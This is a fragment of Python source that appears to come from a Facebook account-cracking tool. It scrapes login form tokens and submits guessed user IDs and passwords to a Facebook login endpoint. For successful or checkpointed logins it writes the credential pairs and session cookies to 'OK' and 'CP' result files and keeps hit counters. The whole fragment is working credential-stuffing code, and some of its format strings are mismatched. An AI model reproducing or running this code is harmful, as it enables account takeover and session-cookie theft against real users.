                    response = xyc.get("https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
                    encoding = {
                       "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                        "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                        "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                        "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                        "try_number": 0, 
                        "unrecognized_tries": 0, 
                        "email":userid,
                        "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], userpas),
                        "login":"Log & In", 
                        "bi_xrwh": 0}
                    params = {"next":"","ref":"dbl","fl":"","login_from_aymh":"1","refid":"8"}
                    xyc.cookies.update({
                        'Cookie': ';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])
                    })
                    headers = Headers().HeadReguler()
                    response = bs4(xyc.post('https://free.prod.facebook.com/login/device-based/regular/login/',data=encoding,params=params,headers=headers).text,"html.parser")
                    payload = xyc.cookies.get_dict()          
                    if 'c_user' in payload.keys():
                        coki = ';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])
                        print(f' *——> {hh}{userid}{nn}<=>{hh}{userpas}{nn}<=>{hh}{coki}{nn}',end='\r'); sys.stdout.flush()
                        resok=('%s<=>%s<=>%s<=>%s<=>%s'%(userid,userpas,coki)) 
                        with open('OK/'+simpan_ok,'a') as wr:
                            wr.write(resok+'\n')
                            wr.close()
                        self.live+=1                
                        break                                                                       
                    elif 'checkpoint' in payload.keys():
                        print(f' *——> {kk}{userid}{nn}<=>{kk}{userpas}{nn}',end='\r'); sys.stdout.flush()
                        rescp=('%s<=>%s<=>%s<=>%s'%(userid,userpas))
                        with open('CP/'+simpan_cp,'a') as wr:
                            wr.write(rescp+'\n')
                            wr.close()
                        self.chek+=1                   
                        break
                    else:continue
            except requests.exceptions.ConnectionError:
                print(f' *—> SFC.Spam.. {len(dumpid)}/{self.loop} self.live :- {self.live} self.chek :- {self.chek}', end='\r'); sys.stdout.flush()
                time.sleep(31)
        self.loop+=1

#----------[ SETTING ]----------#      
if __name__ == '__main__':
    try:
        os.mkdir('OK')
        os.mkdir('CP')
        os.mkdir('data/login')
    except:pass
    try:AdsmanagerFacebook()  
    except Exception as e: exit(e)      
    
        
       